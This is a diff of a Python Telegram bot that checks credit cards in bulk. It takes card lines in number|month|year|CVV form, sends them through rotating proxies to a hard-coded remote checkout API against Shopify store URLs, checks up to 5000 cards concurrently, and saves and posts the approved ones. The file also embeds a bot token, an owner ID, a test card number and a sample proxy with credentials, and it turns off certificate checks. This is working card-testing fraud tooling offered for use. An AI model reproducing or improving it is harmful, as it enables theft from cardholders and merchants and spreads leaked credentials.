@@ -1,10 +1,9 @@
 #!/usr/bin/env python3
 """
-Telegram CC Checker Bot
-python-telegram-bot v21 implementation
+Telegram CC Checker Bot - Complete Version
+python-telegram-bot v21.7
 """
 
-import os
 import sys
 import json
 import re
@@ -17,27 +16,26 @@ import io
 import concurrent.futures
 from pathlib import Path
 from typing import Dict, List, Tuple, Optional, Any
-from urllib.parse import urlparse
 
 import requests
 from requests.adapters import HTTPAdapter
 from urllib3.util.retry import Retry
 import urllib3
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update
 from telegram.ext import (
     Application,
     CommandHandler,
     MessageHandler,
     ContextTypes,
-    filters,
-    CallbackContext
+    filters
 )
 from telegram.constants import ParseMode
 
 # Disable SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Configuration
+# ========== CONFIGURATION ==========
+# IMPORTANT: This token MUST match what you created with BotFather
 BOT_TOKEN = "8036843497:AAGdb6e15p_yWDvfp9cbqplRfQiQH3b3Jzo"
 OWNER_ID = 6821529235
 API_BASE_URL = "http://140.99.254.73:3000/checkout"
@@ -48,14 +46,14 @@ MAX_MASS_CARDS = 5000
 MAX_RETRIES = 3
 REQUEST_TIMEOUT = 30
 
-# Paths
+# ========== PATHS ==========
 BASE_DIR = Path(__file__).parent
 SITES_FILE = BASE_DIR / "sites.json"
 PROXIES_FILE = BASE_DIR / "proxies.json"
 STATS_FILE = BASE_DIR / "stats.json"
 SCRIPTS_DIR = BASE_DIR / "scripts"
 
-# Status mappings
+# ========== STATUS MAPPINGS ==========
 status_emoji = {
     'APPROVED': '✅',
     'APPROVED_OTP': '✅',
@@ -72,14 +70,14 @@ status_text = {
     'ERROR': 'ERROR'
 }
 
-# Initialize logging
+# ========== LOGGING ==========
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-# Global data stores
+# ========== GLOBAL DATA ==========
 sites = []
 proxies = []
 stats = {
@@ -93,11 +91,9 @@ stats = {
     "proxies_count": 0
 }
 
-# Test CC for site testing
 TEST_CC = "4263703530924474|06|2026|400"
 
-# ========== DATA MANAGEMENT FUNCTIONS ==========
-
+# ========== DATA FUNCTIONS ==========
 def load_data():
     """Load data from JSON files"""
     global sites, proxies, stats
@@ -110,7 +106,6 @@ def load_data():
                     sites = ["https://9marks.myshopify.com"]
         else:
             sites = ["https://9marks.myshopify.com"]
-            save_data("sites")
     except Exception as e:
         logger.error(f"Error loading sites: {e}")
         sites = ["https://9marks.myshopify.com"]
@@ -131,14 +126,12 @@ def load_data():
         if STATS_FILE.exists():
             with open(STATS_FILE, 'r') as f:
                 loaded_stats = json.load(f)
-                # Update stats dict with loaded values
                 for key in stats:
                     if key in loaded_stats:
                         stats[key] = loaded_stats[key]
     except Exception as e:
         logger.error(f"Error loading stats: {e}")
     
-    # Ensure scripts directory exists
     SCRIPTS_DIR.mkdir(exist_ok=True)
 
 def save_data(data_type: str):
@@ -177,17 +170,13 @@ def update_stats(status: str, mass_check: bool = False):
     save_data("stats")
 
 # ========== HELPER FUNCTIONS ==========
-
 def extract_cc(text: str) -> Optional[str]:
     """Extract CC from various formats"""
-    # Remove any non-ASCII characters
     text = ''.join(char for char in text if ord(char) < 128)
     
-    # Common CC patterns
     patterns = [
         r'(\d{16})[|:/.\s]+(\d{1,2})[|:/.\s]+(\d{2,4})[|:/.\s]+(\d{3,4})',
         r'(\d{15})[|:/.\s]+(\d{1,2})[|:/.\s]+(\d{2,4})[|:/.\s]+(\d{3,4})',
-        r'(\d{16})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
     ]
     
     for pattern in patterns:
@@ -198,7 +187,6 @@ def extract_cc(text: str) -> Optional[str]:
             mm = groups[1].zfill(2)
             yyyy = groups[2]
             
-            # Handle 2-digit year
             if len(yyyy) == 2:
                 yyyy = "20" + yyyy
             
@@ -252,38 +240,19 @@ def get_bin_info(card_number: str) -> Dict[str, str]:
         "scheme": "Unknown"
     }
 
-def create_session_with_retries() -> requests.Session:
-    """Create requests session with retry strategy"""
-    session = requests.Session()
-    retry_strategy = Retry(
-        total=MAX_RETRIES,
-        backoff_factor=0.5,
-        status_forcelist=[429, 500, 502, 503, 504],
-        allowed_methods=["GET"]
-    )
-    adapter = HTTPAdapter(max_retries=retry_strategy)
-    session.mount("http://", adapter)
-    session.mount("https://", adapter)
-    return session
-
 def parse_proxy(proxy_str: str) -> Optional[Dict[str, str]]:
     """Parse proxy string into components"""
     try:
-        # Remove any whitespace
         proxy_str = proxy_str.strip()
-        
-        # Split by colon
         parts = proxy_str.split(':')
         if len(parts) != 4:
             return None
         
         host, port, username, password = parts
         
-        # Validate port is numeric
         if not port.isdigit():
             return None
         
-        # Build proxy URL in correct format
         proxy_url = f"http://{username}:{password}@{host}:{port}"
         
         return {
@@ -314,14 +283,25 @@ def get_concurrent_limit(proxy_count: int) -> int:
         return 1
     return 0
 
-# ========== API FUNCTIONS ==========
+def create_session_with_retries() -> requests.Session:
+    """Create requests session with retry strategy"""
+    session = requests.Session()
+    retry_strategy = Retry(
+        total=MAX_RETRIES,
+        backoff_factor=0.5,
+        status_forcelist=[429, 500, 502, 503, 504],
+        allowed_methods=["GET"]
+    )
+    adapter = HTTPAdapter(max_retries=retry_strategy)
+    session.mount("http://", adapter)
+    session.mount("https://", adapter)
+    return session
 
 def is_valid_response(response_text: str) -> bool:
     """Check if API response is valid"""
     if not response_text or not isinstance(response_text, str):
         return False
     
-    # Check for empty response
     if response_text.strip() == "":
         return False
     
@@ -377,7 +357,6 @@ def process_response(api_response: str, price: float = 0.00) -> Tuple[str, str, 
     elif 'API_ERROR_' in response_upper:
         return 'API ERROR', 'DECLINED', f"${price:.2f}"
     else:
-        # If we get here but response is valid, check for success indicators
         if any(x in response_upper for x in ['SUCCESS', 'APPROVED', 'APPROVE', 'OK']):
             return api_response, 'APPROVED', f"${price:.2f}"
         return api_response, 'DECLINED', f"${price:.2f}"
@@ -414,30 +393,19 @@ def test_proxy_with_api(proxy_dict: Dict[str, str], site_url: str) -> Tuple[bool
         response_time = time.time() - start_time
         response_text = response.text.strip() if response.status_code == 200 else f"HTTP {response.status_code}"
         
-        # Check if we got a valid response
         if response.status_code == 200 and is_valid_response(response_text):
             return True, response_text, response_time
         else:
             return False, response_text, response_time
         
     except requests.exceptions.ProxyError as e:
-        logger.error(f"Proxy error: {e}")
         return False, f"Proxy Error: {str(e)}", 0.0
     except requests.exceptions.ConnectTimeout as e:
-        logger.error(f"Connection timeout: {e}")
         return False, f"Connection Timeout: {str(e)}", 0.0
     except requests.exceptions.ConnectionError as e:
-        logger.error(f"Connection error: {e}")
         return False, f"Connection Error: {str(e)}", 0.0
-    except requests.exceptions.Timeout as e:
-        logger.error(f"Request timeout: {e}")
-        return False, f"Request Timeout: {str(e)}", 0.0
-    except requests.exceptions.RequestException as e:
-        logger.error(f"Request exception: {e}")
-        return False, f"Request Exception: {str(e)}", 0.0
     except Exception as e:
-        logger.error(f"Unexpected error in proxy test: {e}")
-        return False, f"Unexpected Error: {str(e)}", 0.0
+        return False, f"Error: {str(e)}", 0.0
 
 def check_site(site_url: str, cc: str, proxy_dict: Dict[str, str]) -> Dict[str, Any]:
     """Main check function with proxy"""
@@ -457,11 +425,9 @@ def check_site(site_url: str, cc: str, proxy_dict: Dict[str, str]) -> Dict[str, 
         
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.9',
-            'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'keep-alive',
-            'Upgrade-Insecure-Requests': '1'
+            'Connection': 'keep-alive'
         }
         
         proxy_config = {
@@ -477,8 +443,7 @@ def check_site(site_url: str, cc: str, proxy_dict: Dict[str, str]) -> Dict[str, 
             headers=headers,
             proxies=proxy_config,
             timeout=REQUEST_TIMEOUT,
-            verify=False,
-            allow_redirects=True
+            verify=False
         )
         
         response_time = time.time() - start_time
@@ -487,11 +452,8 @@ def check_site(site_url: str, cc: str, proxy_dict: Dict[str, str]) -> Dict[str, 
             response_text = response.text.strip()
             result["response"] = response_text
             result["response_time"] = response_time
-            
-            # Mark proxy as working if we got any response
             result["proxy_status"] = "✅"
             
-            # Extract price from site URL (simple pattern)
             price_match = re.search(r'[\$£€](\d+\.?\d*)', site_url)
             if price_match:
                 try:
@@ -499,37 +461,27 @@ def check_site(site_url: str, cc: str, proxy_dict: Dict[str, str]) -> Dict[str, 
                 except:
                     result["price"] = 0.00
             
-            # Process response
             processed_response, status, gateway = process_response(response_text, result["price"])
-            result["response"] = processed_response[:100]  # Limit response length
+            result["response"] = processed_response[:100]
             result["status"] = status
             result["gateway"] = gateway if gateway else "Unknown"
-            result["success"] = True
+            result["success"] = True if status != "ERROR" else False
             
-            # If status is not ERROR, mark as success
-            if status != "ERROR":
-                result["success"] = True
         else:
             result["error"] = f"HTTP {response.status_code}"
             result["response"] = f"HTTP {response.status_code}"
             
-    except requests.exceptions.ProxyError as e:
-        result["error"] = f"Proxy Error: {str(e)}"
+    except requests.exceptions.ProxyError:
+        result["error"] = "Proxy Error"
         result["response"] = "Proxy Error"
-    except requests.exceptions.ConnectTimeout as e:
-        result["error"] = f"Connection Timeout: {str(e)}"
+    except requests.exceptions.ConnectTimeout:
+        result["error"] = "Connection Timeout"
         result["response"] = "Timeout"
-    except requests.exceptions.ConnectionError as e:
-        result["error"] = f"Connection Error: {str(e)}"
+    except requests.exceptions.ConnectionError:
+        result["error"] = "Connection Error"
         result["response"] = "Connection Failed"
-    except requests.exceptions.Timeout as e:
-        result["error"] = f"Request Timeout: {str(e)}"
-        result["response"] = "Timeout"
-    except requests.exceptions.RequestException as e:
-        result["error"] = f"Request Error: {str(e)}"
-        result["response"] = "Request Failed"
     except Exception as e:
-        result["error"] = f"Unexpected Error: {str(e)}"
+        result["error"] = f"Error: {str(e)}"
         result["response"] = "System Error"
     
     return result
@@ -540,13 +492,11 @@ def format_message(cc: str, result: Dict[str, Any], bin_info: Dict[str, str],
     parts = cc.split('|')
     card_number = parts[0] if len(parts) > 0 else ""
     
-    # Format card number for display
     if len(card_number) == 16:
         display_cc = f"{card_number[:4]}********{card_number[12:]}"
     else:
         display_cc = card_number
     
-    # Format CC for display
     if len(parts) == 4:
         formatted_cc = f"{display_cc}|{parts[1]}|{parts[2][-2:] if len(parts[2]) >= 2 else parts[2]}|{parts[3]}"
     else:
@@ -559,22 +509,18 @@ def format_message(cc: str, result: Dict[str, Any], bin_info: Dict[str, str],
     emoji = status_emoji.get(result["status"], "⚠️")
     status_display = status_text.get(result["status"], result["status"])
     
-    # Get country flag
     country_flag = ""
     if bin_info["country_code"]:
         try:
-            # Convert country code to regional indicator symbols for flag
             code = bin_info["country_code"].upper()
             if len(code) == 2:
-                # Create flag emoji from country code
                 flag_emoji = ''.join(chr(127397 + ord(c)) for c in code)
                 country_flag = f" {flag_emoji}"
         except:
             pass
     
-    # If no flag could be generated, use generic flag
     if not country_flag and bin_info["country"]:
-        country_flag = " 🇺🇸"  # Default to US flag
+        country_flag = " 🇺🇸"
     
     message = f"""
 ┌─────────────────
@@ -622,7 +568,6 @@ def format_mass_message(total_cards: int, approved_count: int, declined_count: i
     return message.strip()
 
 # ========== COMMAND HANDLERS ==========
-
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /start command"""
     user = update.effective_user
@@ -646,31 +591,13 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 <b>⚠️ IMPORTANT:</b>
 You must add proxies before checking!
-More proxies = faster mass checking.
 
 <b>📋 Commands:</b>
-
-<b>🔍 Single Check:</b>
-/chk CC|MM|YYYY|CVV
-Reply to a message with CC
-
-<b>📁 Mass Check:</b>
-/mass - Send TXT file with CCs (max 5000)
-
-<b>🌐 Proxy Management:</b>
-/addproxy host:port:user:pass - Add proxy (max 20)
+/chk CC|MM|YYYY|CVV - Check single card
+/mass - Send TXT file with CCs
+/addproxy host:port:user:pass - Add proxy
 /listproxies - List all proxies
-/clearproxies - Clear all proxies
-/testproxy host:port:user:pass - Test a proxy
-
-<b>🔧 Site Management:</b>
-/addsite URL - Add single site
-/maddsites URL1 URL2 ... - Add multiple sites
-/listsites - List all sites
-/clearsites - Clear all sites
-/testsite URL - Test a site
-
-<b>📊 Stats:</b>
+/addsite URL - Add site
 /stats - Bot statistics
 """
     
@@ -678,25 +605,18 @@ Reply to a message with CC
 
 async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /chk command"""
-    user = update.effective_user
-    
-    # Check if proxies are available
     if not proxies:
         await update.message.reply_text(
             "❌ <b>NO PROXIES AVAILABLE!</b>\n\n"
-            "You must add at least 1 proxy before checking.\n"
-            "Use: /addproxy host:port:username:password\n\n"
-            "Example: /addproxy 216.10.27.159:6837:ggehzsqw:j6u1cagd9x19",
+            "Use: /addproxy host:port:username:password",
             parse_mode=ParseMode.HTML
         )
         return
     
-    # Check if sites are available
     if not sites:
-        await update.message.reply_text("❌ No sites available. Use /addsite to add a site first.")
+        await update.message.reply_text("❌ No sites available.")
         return
     
-    # Get CC from command arguments or replied message
     cc_text = None
     if context.args:
         cc_text = ' '.join(context.args)
@@ -704,34 +624,27 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         cc_text = update.message.reply_to_message.text
     
     if not cc_text:
-        await update.message.reply_text("❌ Invalid CC format. Use: /chk CC|MM|YYYY|CVV")
+        await update.message.reply_text("❌ Use: /chk CC|MM|YYYY|CVV")
         return
     
-    # Extract CC
     cc = extract_cc(cc_text)
     if not cc:
-        await update.message.reply_text("❌ Invalid CC format. Use: /chk CC|MM|YYYY|CVV")
+        await update.message.reply_text("❌ Invalid CC format.")
         return
     
-    # Send processing message
     processing_msg = await update.message.reply_text("🔄 Checking card with proxy...")
     
-    # Get random proxy and site
     proxy_dict = random.choice(proxies)
     site = random.choice(sites)
     
-    # Perform check
     result = check_site(site, cc, proxy_dict)
     
-    # Get BIN info
     card_number = cc.split('|')[0]
     bin_info = get_bin_info(card_number)
     
-    # Update statistics
     update_stats(result["status"], mass_check=False)
     
-    # Format and send result
-    user_name = user.first_name or user.username or "User"
+    user_name = update.effective_user.first_name or update.effective_user.username or "User"
     message = format_message(cc, result, bin_info, proxy_dict["string"], 
                             result["response_time"], user_name)
     
@@ -740,19 +653,16 @@ async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /mass command"""
-    # Check if proxies are available
     if not proxies:
         await update.message.reply_text(
             "❌ <b>NO PROXIES AVAILABLE!</b>\n\n"
-            "You must add at least 1 proxy before mass checking.\n"
             "Use: /addproxy host:port:username:password",
             parse_mode=ParseMode.HTML
         )
         return
     
-    # Check if sites are available
     if not sites:
-        await update.message.reply_text("❌ No sites available. Use /addsite to add a site first.")
+        await update.message.reply_text("❌ No sites available.")
         return
     
     proxy_count = len(proxies)
@@ -769,7 +679,6 @@ async def mass_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /addproxy command"""
-    # Check if user is owner
     if update.effective_user.id != OWNER_ID:
         await update.message.reply_text("❌ Owner only command.")
         return
@@ -780,31 +689,26 @@ async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     proxy_str = ' '.join(context.args)
     
-    # Check if proxy already exists
     for proxy in proxies:
         if proxy["string"] == proxy_str:
             await update.message.reply_text("⚠️ Proxy already exists.")
             return
     
-    # Check max proxies
     if len(proxies) >= MAX_PROXIES:
-        await update.message.reply_text(f"❌ Maximum {MAX_PROXIES} proxies allowed. Use /clearproxies to remove some.")
+        await update.message.reply_text(f"❌ Maximum {MAX_PROXIES} proxies allowed.")
         return
     
-    # Parse proxy
     proxy_dict = parse_proxy(proxy_str)
     if not proxy_dict:
         await update.message.reply_text("❌ Proxy must be in format: host:port:username:password")
         return
     
-    # Test proxy with API
     test_msg = await update.message.reply_text("🔄 Testing proxy with API...")
     
     site = sites[0] if sites else "https://9marks.myshopify.com"
     success, response_text, response_time = test_proxy_with_api(proxy_dict, site)
     
     if success:
-        # Add proxy to list
         proxies.append(proxy_dict)
         save_data("proxies")
         
@@ -815,10 +719,9 @@ async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"✅ <b>Proxy added successfully!</b>\n\n"
             f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
             f"<b>User:</b> {proxy_dict['username']}\n"
-            f"<b>Status:</b> Working with API ✅\n\n"
+            f"<b>Status:</b> Working ✅\n\n"
             f"📊 <b>Proxies:</b> {len(proxies)}/{MAX_PROXIES}\n"
-            f"⚡ <b>Concurrent Limit:</b> {concurrent_limit} cards\n\n"
-            f"<i>More proxies = faster mass checking!</i>",
+            f"⚡ <b>Concurrent Limit:</b> {concurrent_limit} cards",
             parse_mode=ParseMode.HTML
         )
     else:
@@ -826,9 +729,7 @@ async def addproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"❌ <b>Proxy Test Failed!</b>\n\n"
             f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
-            f"<b>Error:</b> {response_text}\n\n"
-            "Check your proxy credentials and server.\n"
-            "Make sure proxy is working with the checkout API.",
+            f"<b>Error:</b> {response_text}",
             parse_mode=ParseMode.HTML
         )
 
@@ -881,8 +782,7 @@ async def testproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Proxy must be in format: host:port:username:password")
         return
     
-    # Test proxy with API
-    test_msg = await update.message.reply_text("🔄 Testing proxy with API call...")
+    test_msg = await update.message.reply_text("🔄 Testing proxy...")
     
     site = sites[0] if sites else "https://9marks.myshopify.com"
     success, response_text, response_time = test_proxy_with_api(proxy_dict, site)
@@ -893,8 +793,7 @@ async def testproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"✅ <b>Proxy Test Successful!</b>\n\n"
             f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
             f"<b>User:</b> {proxy_dict['username']}\n"
-            f"<b>Status:</b> Working with API ✅\n\n"
-            "Use /addproxy to add this proxy to your list.",
+            f"<b>Status:</b> Working ✅",
             parse_mode=ParseMode.HTML
         )
     else:
@@ -902,9 +801,7 @@ async def testproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"❌ <b>Proxy Test Failed!</b>\n\n"
             f"<b>Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}\n"
-            f"<b>Error:</b> {response_text}\n\n"
-            "Proxy cannot connect to the checkout API.\n"
-            "Check credentials and proxy server status.",
+            f"<b>Error:</b> {response_text}",
             parse_mode=ParseMode.HTML
         )
 
@@ -920,12 +817,10 @@ async def addsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     url = ' '.join(context.args).strip()
     
-    # Validate URL
     if not url.startswith(('http://', 'https://')):
-        await update.message.reply_text("❌ Invalid URL. Must start with http:// or https://")
+        await update.message.reply_text("❌ Invalid URL.")
         return
     
-    # Check if site already exists
     if url in sites:
         await update.message.reply_text("⚠️ Site already exists.")
         return
@@ -934,33 +829,6 @@ async def addsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     save_data("sites")
     
     await update.message.reply_text(f"✅ Site added: {url}")
-
-async def maddsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /maddsites command"""
-    if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("❌ Owner only command.")
-        return
-    
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /maddsites URL1 URL2 ...")
-        return
-    
-    added = 0
-    existing = 0
-    
-    for url in context.args:
-        url = url.strip()
-        if url.startswith(('http://', 'https://')):
-            if url not in sites:
-                sites.append(url)
-                added += 1
-            else:
-                existing += 1
-    
-    if added > 0:
-        save_data("sites")
-    
-    await update.message.reply_text(f"✅ Added {added} new sites, {existing} already existed.")
 
 async def listsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /listsites command"""
@@ -976,83 +844,6 @@ async def listsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message += f"\n📊 Total: {len(sites)}"
     
     await update.message.reply_text(message, parse_mode=ParseMode.HTML)
-
-async def clearsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /clearsites command"""
-    if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("❌ Owner only command.")
-        return
-    
-    if not sites:
-        await update.message.reply_text("⚠️ No sites to clear.")
-        return
-    
-    count = len(sites)
-    sites.clear()
-    # Add default site
-    sites.append("https://9marks.myshopify.com")
-    save_data("sites")
-    
-    await update.message.reply_text(f"✅ Cleared {count} sites (default site added).")
-
-async def testsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle /testsite command"""
-    if update.effective_user.id != OWNER_ID:
-        await update.message.reply_text("❌ Owner only command.")
-        return
-    
-    if not proxies:
-        await update.message.reply_text("❌ No proxies available. Add a proxy first to test the site.")
-        return
-    
-    if not context.args:
-        await update.message.reply_text("❌ Usage: /testsite URL")
-        return
-    
-    url = ' '.join(context.args).strip()
-    
-    if not url.startswith(('http://', 'https://')):
-        await update.message.reply_text("❌ Invalid URL. Must start with http:// or https://")
-        return
-    
-    test_msg = await update.message.reply_text("🔄 Testing site with proxy...")
-    
-    # Get random proxy
-    proxy_dict = random.choice(proxies)
-    
-    # Test with API
-    success, response_text, response_time = test_proxy_with_api(proxy_dict, url)
-    
-    # Determine status
-    if success:
-        processed_response, status, gateway = process_response(response_text, 0.00)
-        emoji = status_emoji.get(status, "⚠️")
-        status_display = status_text.get(status, status)
-    else:
-        emoji = "❌"
-        status_display = "FAILED"
-        processed_response = response_text[:100] if response_text else "No response"
-        gateway = "Unknown"
-    
-    await test_msg.delete()
-    
-    message = f"""
-┌─────────────────
-│ 🔬 SITE TEST RESULT
-└─────────────────
-
-<b>🔗 Site:</b> {url}
-<b>💳 Test CC:</b> {TEST_CC}
-<b>🌐 Proxy:</b> {proxy_dict['host']}:{proxy_dict['port']}
-<b>⏱️ Response Time:</b> {response_time:.2f}s
-
-<b>📊 Status:</b> {emoji} {status_display}
-<b>📝 Response:</b> {processed_response}
-<b>⚡ Gateway:</b> {gateway}
-<b>💰 Price:</b> $0.00
-"""
-    
-    await update.message.reply_text(message.strip(), parse_mode=ParseMode.HTML)
 
 async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle /stats command"""
@@ -1077,9 +868,9 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 <b>❌ Declined:</b> {declined}
 
 <b>📁 Mass Checks:</b> {stats["mass_checks"]}
-<b>🌐 Total Proxies:</b> {proxy_count}/20
+<b>🌐 Proxies:</b> {proxy_count}/20
 <b>⚡ Concurrent Limit:</b> {concurrent_limit}
-<b>🔗 Total Sites:</b> {site_count}
+<b>🔗 Sites:</b> {site_count}
 
 <b>🎯 Success Rate:</b> {success_rate:.1f}%
 """
@@ -1089,11 +880,7 @@ async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle TXT file upload for mass check"""
     if not proxies:
-        await update.message.reply_text(
-            "❌ <b>NO PROXIES AVAILABLE!</b>\n\n"
-            "You must add at least 1 proxy before mass checking.",
-            parse_mode=ParseMode.HTML
-        )
+        await update.message.reply_text("❌ No proxies available.")
         return
     
     if not sites:
@@ -1106,22 +893,17 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Please send a TXT file.")
         return
     
-    # Download file
     file = await document.get_file()
     file_content = await file.download_as_bytearray()
     
     try:
-        # Decode file content
         text = file_content.decode('utf-8', errors='ignore')
-        
-        # Extract CCs
         ccs = extract_multiple_ccs(text)
         
         if not ccs:
-            await update.message.reply_text("❌ No valid CCs found in file.")
+            await update.message.reply_text("❌ No valid CCs found.")
             return
         
-        # Limit to MAX_MASS_CARDS
         if len(ccs) > MAX_MASS_CARDS:
             ccs = ccs[:MAX_MASS_CARDS]
         
@@ -1130,22 +912,18 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         concurrent_limit = get_concurrent_limit(proxy_count)
         site = random.choice(sites)
         
-        # Send initial status
         status_msg = await update.message.reply_text(
             f"🔄 Processing {total_cards} cards...\n\n"
             f"Checked: 0/{total_cards}\n"
             f"✅ Approved: 0\n"
             f"❌ Declined: 0\n\n"
-            f"🌐 Using {proxy_count} proxies\n"
-            f"⚡ Concurrent: {concurrent_limit} cards at once"
+            f"🌐 Using {proxy_count} proxies"
         )
         
-        # Prepare for concurrent processing
         approved_cards = []
         declined_cards = []
         checked_count = 0
         
-        # Create thread pool for concurrent checks
         with concurrent.futures.ThreadPoolExecutor(max_workers=concurrent_limit) as executor:
             futures = []
             
@@ -1154,11 +932,9 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 future = executor.submit(check_site, site, cc, proxy)
                 futures.append((future, cc, proxy["string"]))
             
-            # Process results as they complete
             for future, cc, proxy_str in futures:
                 try:
                     result = future.result(timeout=REQUEST_TIMEOUT + 5)
-                    
                     checked_count += 1
                     
                     if result["status"] in ["APPROVED", "APPROVED_OTP"]:
@@ -1166,33 +942,27 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     else:
                         declined_cards.append(cc)
                     
-                    # Update statistics
                     update_stats(result["status"], mass_check=True)
                     
-                    # Update status message every 10 cards or at the end
                     if checked_count % 10 == 0 or checked_count == total_cards:
                         await status_msg.edit_text(
                             f"🔄 Processing {total_cards} cards...\n\n"
                             f"Checked: {checked_count}/{total_cards}\n"
                             f"✅ Approved: {len(approved_cards)}\n"
                             f"❌ Declined: {len(declined_cards)}\n\n"
-                            f"🌐 Using {proxy_count} proxies\n"
-                            f"⚡ Concurrent: {concurrent_limit} cards at once"
+                            f"🌐 Using {proxy_count} proxies"
                         )
                         
                 except Exception as e:
-                    logger.error(f"Error processing card: {e}")
                     declined_cards.append(cc)
                     checked_count += 1
         
-        # Save approved cards to file
         if approved_cards:
             timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
             filename = SCRIPTS_DIR / f"approved_{timestamp}.txt"
             with open(filename, 'w') as f:
                 f.write('\n'.join(approved_cards))
         
-        # Send final results
         await status_msg.delete()
         
         results_message = format_mass_message(
@@ -1202,11 +972,8 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         await update.message.reply_text(results_message, parse_mode=ParseMode.HTML)
         
-        # Send approved cards if any
         if approved_cards:
             approved_text = "✅ APPROVED CARDS:\n\n" + "\n".join(approved_cards)
-            
-            # Split if too long for Telegram
             if len(approved_text) > 4000:
                 chunks = [approved_text[i:i+4000] for i in range(0, len(approved_text), 4000)]
                 for chunk in chunks:
@@ -1215,35 +982,25 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text(f"<code>{approved_text}</code>", parse_mode=ParseMode.HTML)
                 
     except Exception as e:
-        logger.error(f"Error processing file: {e}")
-        await update.message.reply_text("❌ Error reading file.")
+        await update.message.reply_text(f"❌ Error: {str(e)}")
 
 async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Handle errors"""
-    logger.error(f"Update {update} caused error {context.error}")
-    
-    # Notify user about error
-    if update and update.effective_message:
-        try:
-            await update.effective_message.reply_text(
-                "❌ An error occurred while processing your request."
-            )
-        except:
-            pass
+    logger.error(f"Error: {context.error}")
 
 # ========== MAIN FUNCTION ==========
-
 def main():
     """Start the bot"""
-    # Load data
+    # Load data first
     load_data()
     
     print(f"🤖 Bot starting up...")
     print(f"🌐 Proxies loaded: {len(proxies)}")
     print(f"🔗 Sites loaded: {len(sites)}")
     print(f"📊 Total checks: {stats['total_checks']}")
-    print(f"✅ Approved: {stats['approved']}")
-    print(f"❌ Declined: {stats['declined']}")
+    
+    # DEBUG: Show the token being used
+    print(f"🔑 Using token: {BOT_TOKEN[:10]}...")
     
     # Create application
     application = Application.builder().token(BOT_TOKEN).build()
@@ -1257,10 +1014,7 @@ def main():
     application.add_handler(CommandHandler("clearproxies", clearproxies_command))
     application.add_handler(CommandHandler("testproxy", testproxy_command))
     application.add_handler(CommandHandler("addsite", addsite_command))
-    application.add_handler(CommandHandler("maddsites", maddsites_command))
     application.add_handler(CommandHandler("listsites", listsites_command))
-    application.add_handler(CommandHandler("clearsites", clearsites_command))
-    application.add_handler(CommandHandler("testsite", testsite_command))
     application.add_handler(CommandHandler("stats", stats_command))
     
     # Add document handler for TXT files
